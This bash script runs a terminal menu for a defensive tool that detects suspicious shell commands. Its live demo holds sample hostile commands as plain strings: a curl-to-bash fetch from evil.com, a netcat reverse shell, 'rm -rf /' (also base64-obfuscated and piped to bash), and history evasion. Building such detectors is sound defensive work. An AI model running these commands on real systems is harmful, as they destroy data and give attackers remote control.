#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  SCD — Suspicious Command Detector — Interactive TUI        ║
# ║  A terminal-based command center for scanning, analyzing,   ║
# ║  and detecting malicious shell commands.                    ║
# ╚══════════════════════════════════════════════════════════════╝

set -uo pipefail

# ── Constants ─────────────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCD="$SCRIPT_DIR/scd"
RULES="$SCRIPT_DIR/config/rules.conf"
WHITELIST="$SCRIPT_DIR/config/whitelist.conf"
VERSION="1.0.0"

# ── Settings (mutable) ───────────────────────────────────────────
OUTPUT_FORMAT="text"
THRESHOLD=20
VERBOSE=0
USE_WHITELIST=0

# ── ANSI Colors & Styles ─────────────────────────────────────────
RESET="\033[0m"
BOLD="\033[1m"
DIM="\033[2m"
ITALIC="\033[3m"
UNDERLINE="\033[4m"
BLINK="\033[5m"

# Foreground
BLACK="\033[30m"
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
MAGENTA="\033[35m"
CYAN="\033[36m"
WHITE="\033[37m"

# Bright foreground
BRED="\033[91m"
BGREEN="\033[92m"
BYELLOW="\033[93m"
BBLUE="\033[94m"
BMAGENTA="\033[95m"
BCYAN="\033[96m"
BWHITE="\033[97m"

# Background
BG_BLACK="\033[40m"
BG_RED="\033[41m"
BG_GREEN="\033[42m"
BG_YELLOW="\033[43m"
BG_BLUE="\033[44m"
BG_MAGENTA="\033[45m"
BG_CYAN="\033[46m"

# ── Box Drawing ───────────────────────────────────────────────────
H_LINE="═"
V_LINE="║"
TL_CORNER="╔"
TR_CORNER="╗"
BL_CORNER="╚"
BR_CORNER="╝"
T_LEFT="╠"
T_RIGHT="╣"

# ── Terminal Utilities ────────────────────────────────────────────
term_width() { tput cols 2>/dev/null || echo 80; }
term_height() { tput lines 2>/dev/null || echo 24; }
clear_screen() { printf "\033[2J\033[H"; }
hide_cursor() { printf "\033[?25l"; }
show_cursor() { printf "\033[?25h"; }
move_to() { printf "\033[%d;%dH" "$1" "$2"; }

# ── Drawing Helpers ───────────────────────────────────────────────

draw_box_line() {
    local width=$1
    local content=""
    for ((i = 0; i < width - 2; i++)); do content+="$H_LINE"; done
    echo -e "${CYAN}${TL_CORNER}${content}${TR_CORNER}${RESET}"
}

draw_box_bottom() {
    local width=$1
    local content=""
    for ((i = 0; i < width - 2; i++)); do content+="$H_LINE"; done
    echo -e "${CYAN}${BL_CORNER}${content}${BR_CORNER}${RESET}"
}

draw_box_mid() {
    local width=$1
    local content=""
    for ((i = 0; i < width - 2; i++)); do content+="$H_LINE"; done
    echo -e "${CYAN}${T_LEFT}${content}${T_RIGHT}${RESET}"
}

draw_box_text() {
    local width=$1
    local text="$2"
    local text_clean
    text_clean=$(echo -e "$text" | sed 's/\x1b\[[0-9;]*m//g')
    local text_len=${#text_clean}
    local padding=$((width - 2 - text_len))
    local pad=""
    for ((i = 0; i < padding; i++)); do pad+=" "; done
    echo -e "${CYAN}${V_LINE}${RESET}${text}${pad}${CYAN}${V_LINE}${RESET}"
}

draw_box_center() {
    local width=$1
    local text="$2"
    local text_clean
    text_clean=$(echo -e "$text" | sed 's/\x1b\[[0-9;]*m//g')
    local text_len=${#text_clean}
    local total_pad=$((width - 2 - text_len))
    local left_pad=$((total_pad / 2))
    local right_pad=$((total_pad - left_pad))
    local lpad="" rpad=""
    for ((i = 0; i < left_pad; i++)); do lpad+=" "; done
    for ((i = 0; i < right_pad; i++)); do rpad+=" "; done
    echo -e "${CYAN}${V_LINE}${RESET}${lpad}${text}${rpad}${CYAN}${V_LINE}${RESET}"
}

draw_box_empty() {
    local width=$1
    local pad=""
    for ((i = 0; i < width - 2; i++)); do pad+=" "; done
    echo -e "${CYAN}${V_LINE}${RESET}${pad}${CYAN}${V_LINE}${RESET}"
}

# ── Risk bar visualization ────────────────────────────────────────
draw_risk_bar() {
    local score=$1
    local max=100
    local bar_width=30
    local filled=$((score * bar_width / max))
    local empty=$((bar_width - filled))
    local color=""

    if   [ "$score" -gt 50 ]; then color="$BRED"
    elif [ "$score" -gt 20 ]; then color="$BYELLOW"
    else                           color="$BGREEN"
    fi

    local bar=""
    for ((i = 0; i < filled; i++)); do bar+="█"; done
    for ((i = 0; i < empty; i++)); do bar+="░"; done

    echo -e "${color}${bar}${RESET} ${BOLD}${score}${RESET}/${max}"
}

# ── Spinner Animation ─────────────────────────────────────────────
spinner() {
    local pid=$1
    local msg="${2:-Processing...}"
    local frames=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
    local i=0
    while kill -0 "$pid" 2>/dev/null; do
        printf "\r  ${CYAN}${frames[$i]}${RESET}  ${msg}"
        i=$(( (i + 1) % ${#frames[@]} ))
        sleep 0.1
    done
    printf "\r  ${BGREEN}✓${RESET}  ${msg}  \n"
}

# ── Typing Effect ─────────────────────────────────────────────────
type_text() {
    local text="$1"
    local delay="${2:-0.02}"
    for ((i = 0; i < ${#text}; i++)); do
        printf "%s" "${text:$i:1}"
        sleep "$delay"
    done
    echo
}

# ── Animated Splash Screen ────────────────────────────────────────
show_splash() {
    clear_screen
    hide_cursor

    local w
    w=$(term_width)
    local box_w=60
    if [ "$w" -lt 62 ]; then box_w=$((w - 2)); fi

    echo
    echo -e "${BOLD}${BCYAN}"
    cat << 'BANNER'
       ███████╗ ██████╗██████╗
       ██╔════╝██╔════╝██╔══██╗
       ███████╗██║     ██║  ██║
       ╚════██║██║     ██║  ██║
       ███████║╚██████╗██████╔╝
       ╚══════╝ ╚═════╝╚═════╝
BANNER
    echo -e "${RESET}"

    echo -e "      ${DIM}Suspicious Command Detector${RESET}  ${BOLD}v${VERSION}${RESET}"
    echo -e "      ${DIM}────────────────────────────────────${RESET}"
    echo

    # Animated loading bar
    local bar_w=40
    printf "      ${DIM}Initializing${RESET} "
    for ((i = 0; i <= bar_w; i++)); do
        local pct=$((i * 100 / bar_w))
        printf "\r      ${DIM}Initializing${RESET} ["
        for ((j = 0; j < i; j++)); do printf "${BGREEN}━${RESET}"; done
        for ((j = i; j < bar_w; j++)); do printf "${DIM}─${RESET}"; done
        printf "] ${BOLD}%3d%%${RESET}" "$pct"
        sleep 0.015
    done
    echo

    # System checks
    local checks=(
        "Loading detection rules"
        "Parsing threat patterns"
        "Initializing scoring engine"
        "Ready"
    )
    for check in "${checks[@]}"; do
        sleep 0.2
        echo -e "      ${BGREEN}✓${RESET}  ${check}"
    done

    echo
    echo -e "      ${DIM}Press any key to enter Command Center...${RESET}"
    show_cursor
    read -rsn1
}

# ── Main Menu ─────────────────────────────────────────────────────
show_menu() {
    clear_screen
    local w=56

    echo
    draw_box_line $w
    draw_box_center $w "${BOLD}${BWHITE}🛡️  SCD  —  Command Center${RESET}"
    draw_box_mid $w
    draw_box_empty $w
    draw_box_text $w "  ${BOLD}${BGREEN}[1]${RESET}  🔍  Scan a File"
    draw_box_text $w "  ${BOLD}${BGREEN}[2]${RESET}  ⌨️   Scan Commands (Interactive)"
    draw_box_text $w "  ${BOLD}${BGREEN}[3]${RESET}  🎯  Live Demo"
    draw_box_text $w "  ${BOLD}${BGREEN}[4]${RESET}  ⚙️   Settings"
    draw_box_text $w "  ${BOLD}${BGREEN}[5]${RESET}  📋  View Detection Rules"
    draw_box_text $w "  ${BOLD}${BGREEN}[6]${RESET}  🧪  Run Test Suite"
    draw_box_text $w "  ${BOLD}${BGREEN}[7]${RESET}  📖  Help"
    draw_box_text $w "  ${BOLD}${BRED}[0]${RESET}  🚪  Exit"
    draw_box_empty $w
    draw_box_bottom $w

    echo
    # Status bar
    echo -e "  ${DIM}Format:${RESET} ${BOLD}$OUTPUT_FORMAT${RESET}  ${DIM}│${RESET}  ${DIM}Threshold:${RESET} ${BOLD}$THRESHOLD${RESET}  ${DIM}│${RESET}  ${DIM}Whitelist:${RESET} ${BOLD}$([ $USE_WHITELIST -eq 1 ] && echo "ON" || echo "OFF")${RESET}"
    echo
    printf "  ${BCYAN}❯${RESET} Choose option: "
}

# ── 1. Scan a File ───────────────────────────────────────────────
scan_file() {
    clear_screen
    echo
    echo -e "  ${BOLD}${BCYAN}╔══ 🔍 FILE SCANNER ══╗${RESET}"
    echo
    echo -e "  ${DIM}Enter path to file (or 'b' to go back):${RESET}"
    printf "  ${BCYAN}❯${RESET} "
    read -r filepath

    if [ "$filepath" = "b" ] || [ -z "$filepath" ]; then return; fi

    # Expand ~ to HOME
    filepath="${filepath/#\~/$HOME}"

    if [ ! -f "$filepath" ]; then
        echo -e "\n  ${BRED}✗${RESET} File not found: ${filepath}"
        echo -e "  ${DIM}Press any key to continue...${RESET}"
        read -rsn1
        return
    fi

    local line_count
    line_count=$(wc -l < "$filepath" | tr -d ' ')
    echo
    echo -e "  ${DIM}File:${RESET}  $filepath"
    echo -e "  ${DIM}Lines:${RESET} $line_count"
    echo -e "  ${DIM}────────────────────────────────────────${RESET}"
    echo

    # Build command
    local cmd="$SCD"
    cmd+=" -f $OUTPUT_FORMAT"
    cmd+=" -t $THRESHOLD"
    if [ $VERBOSE -eq 1 ]; then cmd+=" -v"; fi
    if [ $USE_WHITELIST -eq 1 ]; then cmd+=" -w $WHITELIST"; fi
    cmd+=" $filepath"

    # Run with animation
    echo -e "  ${BCYAN}⟳${RESET}  Scanning..."
    echo -e "  ${DIM}────────────────────────────────────────${RESET}"
    echo

    eval "$cmd" 2>&1 | while IFS= read -r line; do
        # Color code alerts
        if echo "$line" | grep -q "CRITICAL"; then
            echo -e "  ${BRED}${line}${RESET}"
        elif echo "$line" | grep -q "HIGH"; then
            echo -e "  ${BYELLOW}${line}${RESET}"
        elif echo "$line" | grep -q "MEDIUM"; then
            echo -e "  ${YELLOW}${line}${RESET}"
        elif echo "$line" | grep -q "dangerous"; then
            echo -e "  ${BOLD}${BRED}${line}${RESET}"
        elif echo "$line" | grep -q "suspicious"; then
            echo -e "  ${BOLD}${BYELLOW}${line}${RESET}"
        elif echo "$line" | grep -q "ALERT"; then
            echo -e "  ${BOLD}${BRED}${line}${RESET}"
        elif echo "$line" | grep -q "═\|─\|──"; then
            echo -e "  ${CYAN}${line}${RESET}"
        else
            echo "  ${line}"
        fi
    done

    local exit_code=${PIPESTATUS[0]}
    echo
    echo -e "  ${DIM}────────────────────────────────────────${RESET}"

    case $exit_code in
        0) echo -e "  ${BGREEN}●${RESET}  Result: ${BOLD}${BGREEN}CLEAN${RESET}  (exit code 0)" ;;
        1) echo -e "  ${BYELLOW}●${RESET}  Result: ${BOLD}${BYELLOW}SUSPICIOUS${RESET}  (exit code 1)" ;;
        2) echo -e "  ${BRED}●${RESET}  Result: ${BOLD}${BRED}DANGEROUS${RESET}  (exit code 2)" ;;
        *) echo -e "  ${RED}●${RESET}  Result: ${BOLD}${RED}ERROR${RESET}  (exit code $exit_code)" ;;
    esac

    echo -e "\n  Risk Meter: $(draw_risk_bar $([ $exit_code -eq 2 ] && echo 85 || ([ $exit_code -eq 1 ] && echo 35 || echo 0)))"

    echo -e "\n  ${DIM}Press any key to continue...${RESET}"
    read -rsn1
}

# ── 2. Interactive Scan ──────────────────────────────────────────
scan_interactive() {
    clear_screen
    echo
    echo -e "  ${BOLD}${BCYAN}╔══ ⌨️  INTERACTIVE SCANNER ══╗${RESET}"
    echo
    echo -e "  ${DIM}Type or paste commands to scan. One per line.${RESET}"
    echo -e "  ${DIM}Type ${BOLD}'done'${RESET}${DIM} to finish, ${BOLD}'back'${RESET}${DIM} to return.${RESET}"
    echo -e "  ${DIM}────────────────────────────────────────${RESET}"
    echo

    local tmpfile
    tmpfile=$(mktemp /tmp/scd_interactive.XXXXXX)
    local count=0

    while true; do
        printf "  ${BYELLOW}cmd[%d]${RESET} ${BCYAN}❯${RESET} " "$((count + 1))"
        read -r input

        if [ "$input" = "done" ] || [ "$input" = "quit" ]; then break; fi
        if [ "$input" = "back" ]; then rm -f "$tmpfile"; return; fi
        if [ -z "$input" ]; then continue; fi

        echo "$input" >> "$tmpfile"
        count=$((count + 1))

        # Quick preview
        local result
        result=$(echo "$input" | "$SCD" -t 0 2>&1 | head -1)
        if echo "$input" | "$SCD" -t 0 >/dev/null 2>&1; then
            echo -e "        ${DIM}└─ ${BGREEN}✓ clean${RESET}"
        else
            local score
            score=$(echo "$input" | "$SCD" -v -t 0 2>&1 | grep -o "score=[0-9]*" | head -1 | cut -d= -f2)
            if [ -n "$score" ] && [ "$score" -gt 50 ]; then
                echo -e "        ${DIM}└─ ${BRED}⚠ dangerous (score: $score)${RESET}"
            else
                echo -e "        ${DIM}└─ ${BYELLOW}⚠ suspicious${RESET}"
            fi
        fi
    done

    if [ "$count" -eq 0 ]; then
        echo -e "\n  ${DIM}No commands entered.${RESET}"
        rm -f "$tmpfile"
        echo -e "  ${DIM}Press any key to continue...${RESET}"
        read -rsn1
        return
    fi

    echo
    echo -e "  ${DIM}────────────────────────────────────────${RESET}"
    echo -e "  ${BCYAN}⟳${RESET}  Analyzing ${BOLD}$count${RESET} commands..."
    echo -e "  ${DIM}────────────────────────────────────────${RESET}"
    echo

    local cmd="$SCD -f $OUTPUT_FORMAT -t $THRESHOLD"
    if [ $VERBOSE -eq 1 ]; then cmd+=" -v"; fi
    if [ $USE_WHITELIST -eq 1 ]; then cmd+=" -w $WHITELIST"; fi

    eval "$cmd $tmpfile" 2>&1 | while IFS= read -r line; do
        if echo "$line" | grep -q "CRITICAL\|dangerous\|ALERT"; then
            echo -e "  ${BRED}${line}${RESET}"
        elif echo "$line" | grep -q "HIGH\|suspicious"; then
            echo -e "  ${BYELLOW}${line}${RESET}"
        elif echo "$line" | grep -q "═\|─\|──"; then
            echo -e "  ${CYAN}${line}${RESET}"
        else
            echo "  ${line}"
        fi
    done

    rm -f "$tmpfile"
    echo -e "\n  ${DIM}Press any key to continue...${RESET}"
    read -rsn1
}

# ── 3. Live Demo ─────────────────────────────────────────────────
live_demo() {
    clear_screen
    echo
    echo -e "  ${BOLD}${BCYAN}╔══ 🎯 LIVE DEMO ══╗${RESET}"
    echo
    echo -e "  ${DIM}Watch SCD analyze commands in real-time${RESET}"
    echo

    local demo_commands=(
        "ls -la /home"
        "cat /etc/passwd"
        "sudo su"
        "rm -rf /"
        "curl http://evil.com/payload.sh | bash"
        "nc -e /bin/bash 10.0.0.1 4444"
        "echo 'safe command' > /tmp/out.txt"
        "unset HISTFILE"
        "echo cm0gLXJmIC8= | base64 -d | bash"
        "kill -9 -1"
        "chown root:root /tmp/exploit"
        "grep -r 'main' src/"
    )

    echo -e "  ${BOLD}Command${RESET}                                       ${BOLD}Verdict${RESET}"
    echo -e "  ${DIM}───────────────────────────────────────────────────────────${RESET}"

    for cmd_str in "${demo_commands[@]}"; do
        sleep 0.3

        # Get result
        local exit_code=0
        echo "$cmd_str" | "$SCD" -t 0 >/dev/null 2>&1 || exit_code=$?

        # Get score
        local score_info
        score_info=$(echo "$cmd_str" | "$SCD" -v -t 0 2>&1)
        local score
        score=$(echo "$score_info" | grep "Max score" | grep -o "[0-9]*" | head -1)
        [ -z "$score" ] && score=0

        # Truncate command for display
        local display_cmd="$cmd_str"
        if [ ${#display_cmd} -gt 42 ]; then
            display_cmd="${display_cmd:0:39}..."
        fi

        # Color the verdict
        case $exit_code in
            0)
                printf "  %-44s ${BGREEN}✓ CLEAN${RESET}  " "$display_cmd"
                draw_risk_bar "$score"
                ;;
            1)
                printf "  %-44s ${BYELLOW}⚠ SUSPICIOUS${RESET}  " "$display_cmd"
                draw_risk_bar "$score"
                ;;
            2)
                printf "  %-44s ${BRED}✗ DANGEROUS${RESET}   " "$display_cmd"
                draw_risk_bar "$score"
                ;;
        esac
    done

    echo -e "  ${DIM}───────────────────────────────────────────────────────────${RESET}"

    # Summary
    echo
    echo -e "  ${BOLD}Demo Summary:${RESET}"
    echo -e "  ${BGREEN}●${RESET} Clean: safe everyday commands"
    echo -e "  ${BYELLOW}●${RESET} Suspicious: potentially risky, review needed"
    echo -e "  ${BRED}●${RESET} Dangerous: high-risk, immediate investigation required"

    echo -e "\n  ${DIM}Press any key to continue...${RESET}"
    read -rsn1
}

# ── 4. Settings ──────────────────────────────────────────────────
settings_menu() {
    while true; do
        clear_screen
        local w=56
        echo
        draw_box_line $w
        draw_box_center $w "${BOLD}${BWHITE}⚙️  Settings${RESET}"
        draw_box_mid $w
        draw_box_empty $w

        local fmt_display=""
        if [ "$OUTPUT_FORMAT" = "json" ]; then
            fmt_display="${BBLUE}JSON${RESET}"
        else
            fmt_display="${BGREEN}TEXT${RESET}"
        fi

        draw_box_text $w "  ${BOLD}[1]${RESET}  Output Format    : ${fmt_display}"
        draw_box_text $w "  ${BOLD}[2]${RESET}  Risk Threshold   : ${BOLD}${BYELLOW}$THRESHOLD${RESET}"
        draw_box_text $w "  ${BOLD}[3]${RESET}  Verbose Mode     : ${BOLD}$([ $VERBOSE -eq 1 ] && echo "${BGREEN}ON" || echo "${RED}OFF")${RESET}"
        draw_box_text $w "  ${BOLD}[4]${RESET}  Whitelist        : ${BOLD}$([ $USE_WHITELIST -eq 1 ] && echo "${BGREEN}ON" || echo "${RED}OFF")${RESET}"
        draw_box_empty $w
        draw_box_text $w "  ${BOLD}${DIM}[0]${RESET}  ${DIM}Back to main menu${RESET}"
        draw_box_empty $w
        draw_box_bottom $w

        echo
        printf "  ${BCYAN}❯${RESET} Choose: "
        read -rsn1 opt
        echo

        case $opt in
            1)
                if [ "$OUTPUT_FORMAT" = "text" ]; then
                    OUTPUT_FORMAT="json"
                    echo -e "\n  ${BGREEN}✓${RESET}  Output format set to ${BOLD}JSON${RESET}"
                else
                    OUTPUT_FORMAT="text"
                    echo -e "\n  ${BGREEN}✓${RESET}  Output format set to ${BOLD}TEXT${RESET}"
                fi
                sleep 0.5
                ;;
            2)
                printf "\n  Enter threshold (0-100): "
                read -r new_thresh
                if [[ "$new_thresh" =~ ^[0-9]+$ ]] && [ "$new_thresh" -ge 0 ] && [ "$new_thresh" -le 100 ]; then
                    THRESHOLD=$new_thresh
                    echo -e "  ${BGREEN}✓${RESET}  Threshold set to ${BOLD}$THRESHOLD${RESET}"
                else
                    echo -e "  ${BRED}✗${RESET}  Invalid threshold"
                fi
                sleep 0.5
                ;;
            3)
                VERBOSE=$((1 - VERBOSE))
                echo -e "\n  ${BGREEN}✓${RESET}  Verbose mode $([ $VERBOSE -eq 1 ] && echo "enabled" || echo "disabled")"
                sleep 0.5
                ;;
            4)
                USE_WHITELIST=$((1 - USE_WHITELIST))
                echo -e "\n  ${BGREEN}✓${RESET}  Whitelist $([ $USE_WHITELIST -eq 1 ] && echo "enabled" || echo "disabled")"
                sleep 0.5
                ;;
            0|b|q) return ;;
        esac
    done
}

# ── 5. View Rules ────────────────────────────────────────────────
view_rules() {
    clear_screen
    echo
    echo -e "  ${BOLD}${BCYAN}╔══ 📋 DETECTION RULES ══╗${RESET}"
    echo
    echo -e "  ${DIM}Source: $RULES${RESET}"
    echo -e "  ${DIM}────────────────────────────────────────────────────────────────────${RESET}"
    echo
    printf "  ${BOLD}%-7s  %-10s  %-28s  %s${RESET}\n" "RULE" "RISK" "PATTERN" "DESCRIPTION"
    echo -e "  ${DIM}──────── ────────── ──────────────────────────── ─────────────────────────${RESET}"

    while IFS= read -r line; do
        # Skip comments and blank lines
        [[ "$line" =~ ^[[:space:]]*# ]] && continue
        [[ -z "${line// }" ]] && continue

        local id risk pattern desc
        id=$(echo "$line" | cut -d'|' -f1)
        risk=$(echo "$line" | cut -d'|' -f2)

        # Use last pipe for description
        desc=$(echo "$line" | rev | cut -d'|' -f1 | rev)
        # Pattern is between 2nd and last pipe
        local after_risk
        after_risk=$(echo "$line" | cut -d'|' -f3-)
        pattern=$(echo "$after_risk" | rev | cut -d'|' -f2- | rev)

        local color=""
        case $risk in
            CRITICAL) color="$BRED" ;;
            HIGH)     color="$BYELLOW" ;;
            MEDIUM)   color="$YELLOW" ;;
            LOW)      color="$DIM" ;;
        esac

        printf "  ${BOLD}%-7s${RESET}  ${color}%-10s${RESET}  %-28s  ${DIM}%s${RESET}\n" \
            "$id" "$risk" "$pattern" "$desc"

    done < "$RULES"

    echo
    echo -e "  ${DIM}────────────────────────────────────────────────────────────────────${RESET}"

    local rule_count
    rule_count=$(grep -v "^#\|^$" "$RULES" | grep -c "|")
    echo -e "  ${DIM}Total:${RESET} ${BOLD}$rule_count${RESET} ${DIM}detection patterns loaded${RESET}"

    echo -e "\n  ${DIM}Press any key to continue...${RESET}"
    read -rsn1
}

# ── 6. Run Tests ─────────────────────────────────────────────────
run_tests() {
    clear_screen
    echo
    echo -e "  ${BOLD}${BCYAN}╔══ 🧪 TEST SUITE ══╗${RESET}"
    echo
    echo -e "  ${DIM}Running all 3 test suites...${RESET}"
    echo

    local total_pass=0 total_fail=0

    for suite in test_parser test_rules test_scoring; do
        local script="$SCRIPT_DIR/tests/${suite}.sh"
        echo -e "  ${BCYAN}▸${RESET}  ${BOLD}${suite}${RESET}"

        local output
        output=$(bash "$script" 2>&1)
        local exit_code=$?

        local passes fails
        passes=$(echo "$output" | grep -c "✓ PASS") || true
        fails=$(echo "$output" | grep -c "✗ FAIL") || true
        total_pass=$((total_pass + passes))
        total_fail=$((total_fail + fails))

        if [ "$exit_code" -eq 0 ]; then
            echo -e "     ${BGREEN}✓ PASSED${RESET}  (${passes} tests)"
        else
            echo -e "     ${BRED}✗ FAILED${RESET}  (${passes} passed, ${fails} failed)"
            # Show failures
            echo "$output" | grep "FAIL" | while IFS= read -r fline; do
                echo -e "       ${BRED}${fline}${RESET}"
            done
        fi
        echo
    done

    echo -e "  ${DIM}════════════════════════════════════════${RESET}"
    if [ "$total_fail" -eq 0 ]; then
        echo -e "  ${BOLD}${BGREEN}✓ ALL TESTS PASSED${RESET}  (${total_pass}/${total_pass})"
    else
        echo -e "  ${BOLD}${BRED}SOME TESTS FAILED${RESET}  (${total_pass} passed, ${total_fail} failed)"
    fi

    echo -e "\n  ${DIM}Press any key to continue...${RESET}"
    read -rsn1
}

# ── 7. Help ──────────────────────────────────────────────────────
show_help() {
    clear_screen
    echo
    echo -e "  ${BOLD}${BCYAN}╔══ 📖 HELP & DOCUMENTATION ══╗${RESET}"
    echo
    echo -e "  ${BOLD}${BWHITE}WHAT IS SCD?${RESET}"
    echo -e "  ${DIM}SCD (Suspicious Command Detector) is a lightweight security${RESET}"
    echo -e "  ${DIM}tool that scans shell command history for dangerous patterns.${RESET}"
    echo
    echo -e "  ${BOLD}${BWHITE}RISK LEVELS${RESET}"
    echo -e "  ${BRED}  CRITICAL (100 pts)${RESET} — System destruction, reverse shells"
    echo -e "  ${BYELLOW}  HIGH     (70 pts)${RESET}  — Privilege escalation, RCE"
    echo -e "  ${YELLOW}  MEDIUM   (40 pts)${RESET}  — Persistence, obfuscation"
    echo -e "  ${DIM}  LOW      (15 pts)${RESET}  — History evasion"
    echo
    echo -e "  ${BOLD}${BWHITE}SCORE THRESHOLDS${RESET}"
    echo -e "  ${BGREEN}  0-20${RESET}   → Clean     (exit 0)"
    echo -e "  ${BYELLOW}  21-50${RESET}  → Suspicious (exit 1)"
    echo -e "  ${BRED}  51-100${RESET} → Dangerous  (exit 2)"
    echo
    echo -e "  ${BOLD}${BWHITE}CLI USAGE${RESET}"
    echo -e "  ${CYAN}  scd [OPTIONS] [FILE]${RESET}"
    echo -e "  ${DIM}  -f json    JSON output"
    echo -e "  -v         Verbose (show all commands)"
    echo -e "  -t N       Set threshold (default 20)"
    echo -e "  -d         Daemon mode"
    echo -e "  -w FILE    Whitelist file"
    echo -e "  -l FILE    Log to file${RESET}"
    echo
    echo -e "  ${BOLD}${BWHITE}TUI SHORTCUTS${RESET}"
    echo -e "  ${DIM}  Numbers 0-7 select menu options"
    echo -e "  'b' or 'q' goes back from any screen"
    echo -e "  Settings persist for the session${RESET}"

    echo -e "\n  ${DIM}Press any key to continue...${RESET}"
    read -rsn1
}

# ── Exit Animation ────────────────────────────────────────────────
show_exit() {
    clear_screen
    echo
    echo -e "  ${BOLD}${BCYAN}"
    cat << 'EXIT_ART'
       ╔═══════════════════════════════════╗
       ║                                   ║
       ║   Thanks for using SCD! 🛡️         ║
       ║   Stay safe out there.            ║
       ║                                   ║
       ╚═══════════════════════════════════╝
EXIT_ART
    echo -e "${RESET}"
    echo -e "  ${DIM}Hunt. Score. Alert. Defend.${RESET}"
    echo
    sleep 0.5
}

# ── Pre-flight Checks ────────────────────────────────────────────
preflight() {
    if [ ! -f "$SCD" ]; then
        echo -e "${BYELLOW}⚠${RESET}  SCD binary not found. Building..."
        (cd "$SCRIPT_DIR" && make all >/dev/null 2>&1) &
        spinner $! "Building SCD from source"
        if [ ! -f "$SCD" ]; then
            echo -e "${BRED}✗${RESET}  Build failed. Run 'make all' manually."
            exit 1
        fi
    fi
    if [ ! -f "$RULES" ]; then
        echo -e "${BRED}✗${RESET}  Rules config not found at $RULES"
        exit 1
    fi
}

# ── Cleanup on exit ──────────────────────────────────────────────
cleanup() {
    show_cursor
    rm -f /tmp/scd_interactive.* 2>/dev/null
}
trap cleanup EXIT

# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════

preflight
show_splash

while true; do
    show_menu
    read -rsn1 choice
    echo

    case $choice in
        1) scan_file ;;
        2) scan_interactive ;;
        3) live_demo ;;
        4) settings_menu ;;
        5) view_rules ;;
        6) run_tests ;;
        7) show_help ;;
        0|q)
            show_exit
            break
            ;;
        *)
            echo -e "  ${BRED}Invalid option${RESET}"
            sleep 0.3
            ;;
    esac
done
